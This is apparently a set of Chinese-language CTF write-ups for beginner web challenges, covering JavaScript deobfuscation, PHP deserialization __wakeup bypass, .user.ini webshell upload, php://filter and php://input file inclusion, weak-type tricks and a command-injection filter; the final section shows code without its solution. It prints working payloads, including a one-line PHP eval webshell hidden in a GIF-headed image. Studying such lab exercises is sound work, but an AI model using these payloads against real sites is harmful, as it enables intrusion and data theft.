### simple_js

默认弹出窗口，先 f12，查看源代码，发现 js 代码如下

```html
<html>
  <head>
    <title>JS</title>
    <script type="text/javascript">
      function dechiffre(pass_enc) {
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
        var tab = pass_enc.split(",");
        var tab2 = pass.split(",");
        var i,
          j,
          k,
          l = 0,
          m,
          n,
          o,
          p = "";
        i = 0;
        j = tab.length;
        k = j + l + (n = 0);
        n = tab2.length;
        for (i = o = 0; i < (k = j = n); i++) {
          o = tab[i - l];
          p += String.fromCharCode((o = tab2[i]));
          if (i == 5) break;
        }
        for (i = o = 0; i < (k = j = n); i++) {
          o = tab[i - l];
          if (i > 5 && i < k - 1) p += String.fromCharCode((o = tab2[i]));
        }
        p += String.fromCharCode(tab2[17]);
        pass = p;
        return pass;
      }
      String["fromCharCode"](
        dechiffre(
          "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"
        )
      );

      h = window.prompt("Enter password");
      alert(dechiffre(h));
    </script>
  </head>
</html>
```

分析得出，无论弹出的对话框输入密码正确与否都只会返回同一个字符串；

真正的密码就是这以下代码中的 16 进制加密数据

```js
String["fromCharCode"](
  dechiffre(
    "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"
  )
);
```

<br>

同样的，直接在开发者工具的控制台内使用 String 函数对这段编码进行解码

之后编码转换，直接获取 flag

flag 为 `786OsErtk12`

> 注意提交是的格式！！！所以正确答案应该为 cyberspace{786OsErtk12}

![](../imgs/contest/xctf_noob/xn1.png)

<br>

### PHP2

> php 是给开发者看的源代码，phps 是为了直接在网页中查看 php 源码而设计的文件

通过 index.phps 获取网页 php 源代码

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>
```

<br>

### unserialize3

目的：通过反序列化绕过魔法函数 wakeup

原理：  
当执行反序列化时会首先运行魔法函数 `__wakeup()`；我们需要绕过该魔法函数才能正确获取 flag  
仅需使序列化成员数大于实际成员数即可！

打开 phpstorm，写入以下代码，获取类 xctf 的序列化内容

```php
<?php
class xctf
{
    public $flag = '111';

    public function __wakeup()
    {
        exit('bad requests');
    }
}

$a=new xctf();
var_dump(serialize($a));
```

<br>

得到的序列化内容：  
`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`

我们增加实际成员数，即把 1 改成 2，此时得到：  
`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

<br>

将该序列化内容作为负载写入 URL  
`xxx.xxx.xxx.xxx/index.php?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

即可绕过 wakeup 获取正确的 flag

<br>

### easyupload

题解：利用 .user.ini 配置文件挂载后门程序，使用蚁剑链接得到 flag

可以先制作一个 `.user.ini` 文件

```ini
GIF89a
auto_prepend_file=a.jpg
```

在制作一个带一句话木马的图片 `a.jpg`

```php
GIF89a
<?=eval($_POST['cmd']);?>
```

<br>

使用 burp 拦截每一次上传请求，把 content-type 全部改为 image/jpg，这样才可以绕过类型检测

完毕后中国蚁剑找到文件上传点，链接即可

<br>

### fileclude

题解：`php://filter/red` + `php://input` 绕过

打开网站首先看到的是一串源码

```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET["file1"]) && isset($_GET["file2"]))
{
    $file1 = $_GET["file1"];
    $file2 = $_GET["file2"];
    if(!empty($file1) && !empty($file2))
    {
        if(file_get_contents($file2) === "hello ctf")
        {
            include($file1);
        }
    }
    else
        die("NONONO");
}
```

大意就是：需要通过 url 传入两个参数 file1 和 file2，且 file2 的内容必须为 `hello ctf`

<br>

可以构造如下载荷

`?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=php://input`

通过 apifox 中的 POST 请求，请求体使用 raw 格式，写入 hello ctf，此即代表了 file2 的内容！

> file1 读取 flag.php 文件，而 file2 通过 POST 请求体传入指定字符串，成功拿到经过 base64 加密后的 flag

<br>

### easyphp

题解：纯阅读理解题，自己看代码

涉及知识点：php 语法、弱类型绕过、md5 碰撞

分析代码：

```php
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;

// URL传参，两个参数分别为a和b
$a = $_GET['a'];
$b = $_GET['b'];

// 限制参数a属性
if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
    // 限制参数b属性
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
        $key1 = 1;
        }else{
            die("Emmm...再想想");
        }
    }else{
    die("Emmm...");
}

$c=(array)json_decode(@$_GET['c']);
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
        $d = array_search("DGGJ", $c["n"]);
        $d === false?die("no..."):NULL;
        foreach($c["n"] as $key=>$val){
            $val==="DGGJ"?die("no......"):NULL;
        }
        $key2 = 1;
    }else{
        die("no hack");
    }
}else{
    die("no");
}

if($key1 && $key2){
    include "Hgfks.php";
    echo "You're right"."\n";
    echo $flag;
}

?>
```

<br>

### file_include

题解：通过 convert.iconv 进行编码转换

源码：

```php
<?php
highlight_file(__FILE__);
    include("./check.php");
    if(isset($_GET['filename'])){
        $filename  = $_GET['filename'];
        include($filename);
    }
?>
```

经过尝试，发现基本的 `filter` 以及 `string.*` `convert.*` 大多数被过滤掉而无法使用

<br>

可以尝试使用 `convert.iconv.a.b/resource`  
其中 a 表示输入内容的编码类型，b 表示输出内容的编码类型

使用 burp 进行部分常见 php 编码类型的爆破后，得到一组正确的输入输出编码，作为 payload 待入 url 进行请求即可得到 flag  
`php://filter/convert.iconv.a.b/resource=flag.php`

<br>

### unseping

题解：

知识点：反序列化、命令执行绕过、空格绕过、空环境变量绕过

<br>

分析代码

```php
<?php
highlight_file(__FILE__);

class ease{

    private $method;
    private $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }

    function __destruct(){
        if (in_array($this->method, array("ping"))) {
            call_user_func_array(array($this, $this->method), $this->args);
        }
    }

    function ping($ip){
        exec($ip, $result);
        var_dump($result);
    }

    function waf($str){
        if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
            return $str;
        } else {
            echo "don't hack";
        }
    }

    function __wakeup(){
        foreach($this->args as $k => $v) {
            $this->args[$k] = $this->waf($v);
        }
    }
}

$ctf=@$_POST['ctf'];
@unserialize(base64_decode($ctf));
?>
```
